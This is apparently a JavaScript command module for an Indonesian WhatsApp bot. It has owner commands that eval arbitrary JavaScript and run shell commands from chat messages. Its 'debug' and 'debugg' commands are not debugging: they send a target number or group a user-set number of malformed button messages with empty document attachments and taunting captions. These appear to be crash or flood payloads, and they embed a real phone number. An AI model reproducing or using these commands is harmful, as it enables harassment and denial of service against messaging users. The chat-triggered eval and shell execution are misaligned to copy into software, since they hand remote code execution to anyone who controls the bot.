process.on("uncaughtException", console.log);
cmd.on(['>'], [], async (msg, {
  client, command, text
}) => {
  // let parse = command.includes('=>') ? text.replace('=>', 'return '): text.replace('>', '')
  let parse = text.replace('>', '');
  if (text.includes("return") || text.includes("await") || text.includes("let") || text.includes("var") || text.includes("const")) {
    try {
      let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => {
        return e
      });
      return client.reply(msg, functions.util.format(evaluate));
    } catch (e) {
      return client.reply(msg, functions.util.format(e));
    }
  }
  try {
    let evaluate = await eval(`;(async () => { return ${parse} })()`).catch(e => {
      return e
    });
    return client.reply(msg, functions.util.format(evaluate));
  } catch (e) {
    return client.reply(msg, functions.util.format(e));
  }
}, {
  owner: '--noresp', prefix: false
})

cmd.on(['!>'], [], async (msg, {
  client, command, text
}) => {
  let parse = command.includes('=>') ? text.replace('=>', 'return ') : text.replace('!>', '')
  try {
    let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => {
      return e
    });
    return client.reply(msg, functions.util.format(evaluate));
  } catch (e) {
    return client.reply(msg, functions.util.format(e));
  }
}, {
  owner: '--noresp', prefix: false
})


cmd.on(['$'], [], async (msg, {
  query, client
}) => {
  try {
    functions.exec(`${query}`, (err, out) => {
      if (err) return client.reply(msg, functions.util.format(err));
      client.reply(msg, functions.util.format(out));
    });
  } catch (e) {
    return client.reply(msg,
      functions.util.format(e));
  }
}, {
  owner: '--noresp', prefix: false
})
cmd.on(["shutdown", 'reset'], [], async (msg, {
  client,
  command
}) => {
  let resp = command[0].toUpperCase() + command.slice(1).toLowerCase() + " Bot..."
  await client.reply(msg,
    resp)
  let update = Object.keys(database).forEach(tr => {
    if (tr == 'session') return;
    functions.fs.writeFileSync('./src/json/' + tr + '.json', JSON.stringify(database[tr]));
  });
  if (command.toLowerCase() == 'shutdown') {
    global.shutoff = true
  }
  await session.saveCreds(...lastargs);
  await client.end(resp)
}, {
  owner: "--noresp"
})

cmd.on(['block', 'unblock'], [], async (msg, {
  client,
  command
}) => {
  let users = msg.groupData? msg.quotedMsg? msg.quotedMsg.sender.jid : query + '@s.whatsapp.net' : msg.sender.jid
  if (command == "block") {
    await client.updateBlockStatus(users, 'block').then((res) => client.reply(msg, `Sukses Block Chats`)).catch((err) => client.reply(msg, `Terjadi Kesalahan\n\n${err}`))
  }
  if (command == "unblock") {
    await client.updateBlockStatus(users, 'unblock').then((res) => client.reply(msg, `Sukses UnBlock Chats`)).catch((err) => client.reply(msg, `Terjadi Kesalahan\n\n${err}`))
  }
}, {
  owner: "--noresp"
})

cmd.on(['debugg'], [], async (msg, { client, query, text }) => {
  let target = query.split("|")[0]
  let pesan = query.split("|")[1]
  let repeat = query.split("|")[2]
  // target = target.split('').filter(tr => Number(tr)).join('').trim() + "@s.whatsapp.net"
  await client.sendMessage(`${target}@g.us`, { text: pesan })

  for (let i = 0; i < repeat; i++) {
    await client.sendButton(`${target}@g.us`, {
      document: Buffer.alloc(0),
      mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      fileName: 'SqueezedOrange',
      url: "wa.me/6283862323152",
      caption: "Cih Elit",
      footer: "Mendokusai"
    },
      [{ url: "Gaterima? chat Gw Sini", value: "https://www.whatsapp.com/otp/copy/wa.me/6283862323152" }, { url: "ni no wa nya", value: "wa.me/6283862323152" }, { call: "Nomer Gueh", value: "+6283862323152" }])
  }
  client.reply(msg, "sukses")
}, {
  owner: '--noresp',
  query: "Hahaha",
  param: functions.needed('query')
})

cmd.on(['debug'], [], async (msg, { client, query, text }) => {
  try {
    let num = query.split("|")[0]
    let pesan = query.split("|")[1]
    let repeat = query.split("|")[2]
    target = num + "@s.whatsapp.net"
    await client.sendMessage(target, { text: pesan })

    for (let i = 0; i < repeat; i++) {
      await client.sendButton(target, {
        document: Buffer.alloc(0),
        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
        fileName: 'SqueezedOrange',
        url: "wa.me/6283862323152",
        caption: "Cih Elit",
        footer: "Mendokusai"
      },
        [{ url: "Gaterima? chat Gw Sini", value: "https://www.whatsapp.com/otp/copy/wa.me/6283862323152" }, { url: "ni no wa nya", value: "wa.me/6283862323152" }, { call: "Nomer Gueh", value: "+6283862323152" }])
    }
    client.reply(msg, "sukses")
  } catch (e) {
    return client.reply(msg, functions.util.format(e));
  }
}, {
  owner: '--noresp',
  query: "Hahaha",
  param: functions.needed('query')
})